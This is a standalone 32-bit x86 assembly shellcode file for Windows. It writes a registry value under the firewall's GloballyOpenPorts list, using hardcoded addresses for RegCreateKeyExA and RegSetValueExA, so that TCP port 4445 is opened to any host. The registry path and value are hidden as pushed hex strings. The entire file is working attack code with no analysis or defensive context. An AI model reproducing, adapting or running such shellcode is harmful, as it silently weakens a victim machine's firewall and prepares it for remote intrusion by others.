[BITS 32]
 
global _start
 
_start:
 
;for the handle
xor edx, edx
mov edi, esp
mov dword [edi], edx
sub esp, 0x10       ;avoid handle being overwritten
 
;Prepare the key
push 0x00747369
push 0x4c5c7374
push 0x726f506e
push 0x65704f79
push 0x6c6c6162
push 0x6f6c475c
push 0x656c6966
push 0x6f725064
push 0x7261646e
push 0x6174535c
push 0x7963696c
push 0x6f706c6c
push 0x61776572
push 0x69465c73
push 0x72657465
push 0x6d617261
push 0x505c7373
push 0x65636341
push 0x64657261
push 0x68535c73
push 0x65636976
push 0x7265535c
push 0x7465536c
push 0x6f72746e
push 0x6f43746e
push 0x65727275
push 0x435c4d45
push 0x54535953
mov edx, esp
 
xor eax, eax
push eax              ;pDisposion = NULL
push edi              ;pHandle
push eax              ;pSecurity = NULL
push 0x0f003f         ;Access = KEY_ALL_ACCESS
push eax              ;Options = REG_OPTION_NON_VOLATILE
push eax              ;Class = NULL
push eax              ;Reserved = NULL
push edx              ;Subkey
push 0x80000002       ;hkey = HKEY_LOCAL_MACHINE
mov eax, 0x77dde9e4 ;RegCreateKeyExA
call eax
 
;RegSetValue ValueName = 4445:TCP
xor edx, edx
push edx
push 0x5043543a
push 0x35343434
mov edx, esp
 
;REgSEtValue buffer = 4445:TCP:*:Enabled:test
xor ecx, ecx
push ecx
push 0x00747365
push 0x743a6465
push 0x6c62616e
push 0x453a2a3a
push 0x5043543a
push 0x35343434
mov ecx, esp
 
xor eax, eax
inc eax
push 0x18           ;BufSize = 0x16
push ecx            ;Buffer
push eax            ;ValueType = REG-SZ
dec eax
push eax            ;Reserved = 0
push edx            ;ValueName
push dword [edi]    ;hKey
mov eax, 0x77ddead7 ;RegSetValueExA
call eax
 
push dword [edi]     ;hKey
mov eax,  0x77dd6c17 ;RegCloseKey
call eax
